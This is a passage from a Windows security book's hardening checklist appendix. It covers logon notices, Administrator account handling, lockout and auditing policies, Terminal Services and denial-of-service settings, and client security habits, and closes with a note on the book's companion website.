legal notice for Windows logon. This can be done by   adding or editing the Registry values shown here: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon Name                   Data Type      Value LegalNoticeCaption     REG_SZ         [custom caption] LegalNoticeText        REG_SZ         [custom message]    Windows 2000 and later will display a window with the custom caption and   message provided by these values after the user presses CTRL-ALT-DEL and before  the logon dialog box is presented, even when logging on via TS  make sure  Hotﬁ x Q274190 is applied .     Rename the Administrator account and assign it a very strong password.    Remember that the true Administrator account cannot be locked out  interactively, via TS.  Create a decoy Administrator account and audit logon  events  at a minimum .     Ensure that an Account Lockout threshold is set for all user accounts and that   users are required to set complex passwords.     Audit success and failure of logons and review the logs regularly  either   manually or through an automated process  to monitor for brute-force  password guessing and other attacks.     Do not allow untrusted users to log on via TS, which is the equivalent of   interactive logon. Use the Remote Desktop Users group to manage authorized  users.   Appendix A:  Windows Security Checklist   417     Require 128-bit client security.    Remember that TS security varies depending on the mode, Administration or  Application mode. In Application mode, users will have the near equivalent of  interactive logon from remote locations, so other controls like SRP should be  implemented to assure that non-approved apps cannot be executed.  DENIAL OF SERVICE CONSIDERATIONS  Here are some considerations for mitigating denial of service  DoS  attacks:     Employ appropriate settings on upstream network devices to perform   throttling.     Keep up with hotﬁ xes and service packs.    Conﬁ gure the TCP IP parameters to mitigate DoS attacks for Internet-facing  servers. The following table lists recommendations provided by Microsoft via  various references noted.  The references to Regentry.chm refer to the Windows  2000 Reskit Technical Reference to the Registry in compiled HTML help ﬁ le  format; if the Resource Kit is installed, just run regentry.chm and the ﬁ le will open.

Appendix A:  Windows Security Checklist   419     Run with least privilege. Never log on as Administrator  or equivalent highly-  privileged account  on a system that you will use to browse the Internet or read  e-mail.     All client software is up-to-date on all relevant software security patches    automatic updates, such as Microsoft’s Automatic Update Service, are  strongly recommended .     Antivirus software is installed and conﬁ gured to scan real-time  particularly   incoming mail attachments , and keep itself updated automatically.     Anti-adware spyware and anti-phishing utilities are installed in addition to   antivirus  assuming antivirus does not already have these features .     Conﬁ gure Internet client security conservatively; for example, Windows   Internet Options Control Panel  also accessible through IE and Outlook OE   should be conﬁ gured as advocated in Chapter 10.     If conﬁ gured separately, ensure other client software  especially e-mail!  uses  the most conservative security settings  for example, Restricted Sites zone in  Microsoft e-mail clients .     Conﬁ gure ofﬁ ce productivity programs as securely as possible; for example,  set the Microsoft Ofﬁ ce macro security to Very High under Tools  Macro   Security.     Cookie management is enabled within the browser or via third-party tool such   as CookiePal.     Disable caching of SSL data.    E-mail software is conﬁ gured to read e-mail in plaintext.    Kill bit set on unneeded ActiveX controls.    Change operating system default conﬁ gurations  for example, instead of  the default C:\Windows, install with an unusual Windows folder name like  C:\Root .     Don’t be gullible. Approach Internet-borne solicitations and transactions with   high skepticism. For sensitive URIs  such as those for online banking , manually  type addresses or use known-good Favorites Bookmarks, and never click  hyperlinks.     Keep your computing devices physically secure  especially mobile devices such   as laptops, Blackberrys, and cell phones .   420   Hacking Exposed Windows: Windows Security Secrets & Solutions   AUDIT YOURSELF!  The whole point of this book is that you can never be sure if your system is really secure  without  checking  it  yourself.  Continuous  assessment  of  security  is  critical  in  today’s  24 7 environments. Don’t let your guard down!     Regularly follow the methodology outlined in this book to audit your own   compliance to the recommendations listed here.     If the task of self-audit is too burdensome, outsource to an independent security   services provider.   A b o u t   t h e   C o m pa n i o n   W e b S i t e  B  421   422   Hacking Exposed Windows: Windows Security Secrets & Solutions   Windows security is a rapidly changing discipline, and we recognize that the   printed word is often not the most adequate medium to keep current with all  of the new happenings in this vibrant area of research.  Thus,  we  have  implemented  a  World  Wide  Web  site  that  tracks  new  information  relevant  to  topics  discussed  in  this  book,  along  with  errata  and  a  compilation  of  the  public-domain  tools,  scripts,  and  configuration  files  we  have  covered  throughout  the  book. That site address is  http:  www.winhackingexposed.com The site also provides a forum to talk directly with the authors via e-mail: joel@winhackingexposed.com We hope that you return to the site frequently as you read through these chapters to  view any updated materials, gain easy access to the tools that we mention, and otherwise  keep up with the ever-changing face of Windows security. Otherwise, you never know  what new developments may jeopardize your network before you can defend yourself  against them.  Unless specifically noted otherwise, the tools available via www.winhackingexposed.com were not  produced by the authors, who make no warranties or claims as to their functionality, nor do they  undertake any liability for unexpected consequences of their use or misuse.
